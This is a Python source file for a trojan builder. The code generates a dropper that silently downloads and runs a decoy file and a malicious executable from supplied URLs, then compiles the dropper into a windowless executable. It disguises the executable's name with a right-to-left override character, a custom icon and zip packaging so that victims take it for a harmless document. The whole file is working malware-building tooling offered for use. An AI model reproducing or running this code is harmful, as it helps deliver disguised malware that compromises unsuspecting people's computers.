import os
import shutil
import zipfile
import subprocess

PYINSTALLER_PATH = 'C:\\Users\\{}\\Anaconda2\\Scripts\\pyinstaller.exe'.format(os.getenv('username'))
TROJAN = """from urllib import urlretrieve
from os import getenv
from subprocess import Popen

file = "{0}"
name = "C:\\\\Users\\\\" + getenv('username') + "\\\\AppData\\\\Local\\\\Temp\\\\" + "file.{2}"

trojanFile = "{1}"
trojanPath = "C:\\\\Users\\\\" + getenv('username') + "\\\\AppData\\\\Local\\\\Temp\\\\" + "file.exe"

try:
    urlretrieve(file, name)
    Popen([name], shell=True)
    
    urlretrieve(trojanFile, trojanPath)
    Popen([trojanPath], shell=True)
except Exception:
    pass"""
	
	
class FileTypeError(Exception):
    """Custom exception for when icon provided is not .ico"""

    def __init__(self, message):
        super().__init__(message)


class InvalidExtensionError(Exception):
    """Custom exception for invalid executable extension"""

    def __init__(self, message):
        super().__init__(message)


class GenerateTrojan:
    def __init__(self, frontfile_url, malicious_url):
        self.malicious_url = malicious_url
        self.frontfile_url = frontfile_url
		
        self.name = ''
		
        self.s_extension = ''
        self.m_extension = 'exe'
		
		# --upx causes errors for some in python 3.6 and is therefore removed (difference of about 0.5MB in size).
        # If needed, you can compress it at a later time.
        self.pyinstaller_command = PYINSTALLER_PATH + ' trojan.py --onefile --noconsole --noupx'
		
        self.zip = False
        self.spoof = False
        self.zipped = False
        self.generated = False

    def set_icon(self, icon_path):
        """Sets executable icon"""
		
		# Check if if file exists and is an icon file.
        if not os.path.isfile(icon_path):
            raise FileNotFoundError(icon_path + ' does not exist.')
        elif icon_path.split('.')[-1] != 'ico':
            raise FileTypeError(icon_path.split('.')[-1] + ' is not an icon file. Please use a .ico file.')
			
		# Finally append --icon to pyinstaller command.
        self.pyinstaller_command = self.pyinstaller_command + ' --icon=' + icon_path

    def spoof_extension(self, extension):
        """Sets the file extension to the one provided as an argument"""
		
		# Remove dot if added to prevent future errors.
        self.s_extension = extension.replace('.', '').lower()
		# Automatically zip file if extension is spoofed to prevent name from looking weird.
        self.zip = True
        self.spoof = True

    def main_extension(self, extension):
        """Sets the main extension of the file, like scr, com or exe (all are executable formats)"""
		
		# Remove dot if added to prevent future errors.
        extension = extension.replace('.', '').lower()
		
        if extension in ('exe', 'scr', 'com'):
            self.m_extension = extension
        else:
            raise InvalidExtensionError('The provided extension "{}" is not executable.'.format(extension))

    def add_to_zip(self):
        """Adds file to a zip archive"""
		
		# Check if file exists and if it is already zipped.
        if not self.generated:
            raise FileNotFoundError('File needs to be generated before it is zipped.')
        elif self.zipped:
            return
			
        zipfile.ZipFile('trojan.zip', mode='w').write(self.final_name)

    def generate(self, name, zip_file=False):
        """Generates executable file"""
		
		# Remove extension (it is added later).
        self.name = name.replace('.exe', '')
		
		# Write python trojan.	
        with open('trojan.py', 'w') as trojan_file:
            trojan_file.write(TROJAN.format(self.frontfile_url, self.malicious_url, self.frontfile_url.split('.')[-1]))
		
		# Compile trojan
        subprocess.call(self.pyinstaller_command + ' --name=' + self.name, stdout=True)
        self.generated = True
		
		# If selected, spoof file name.
        if self.spoof:
            reverse_char = u"\u202E"
            spoof_name = self.name + reverse_char + self.s_extension[::-1] + '.' + self.m_extension
            try:
                os.rename('dist/{}.exe'.format(self.name), spoof_name)
            except FileExistsError:
                os.remove(spoof_name)
                os.rename('dist/{}.exe'.format(self.name), spoof_name)

            self.final_name = spoof_name
        else:
            try:
                os.rename('dist/{}.exe'.format(self.name), self.name + '.{}'.format(self.m_extension))
            except FileExistsError:
                os.remove(self.name + ('.{}').format(self.m_extension))
                os.rename('dist/{}.exe'.format(self.name), self.name + '.{}'.format(self.m_extension))

            self.final_name = self.name + '.{}'.format(self.m_extension)
			
		# File will automatically be zipped if extension is spoofed, but can also be zipped if not.
        if zip_file or self.zip:
            self.add_to_zip()
            self.zipped = True

    def cleanup(self):
        """Delete all extra files and folders created by pyinstaller"""
		
        if self.zipped:
            os.remove(self.final_name)
			
        os.remove('trojan.py')
        os.remove('{}.spec'.format(self.name))
        shutil.rmtree('build', ignore_errors=True)
        shutil.rmtree('dist', ignore_errors=True)
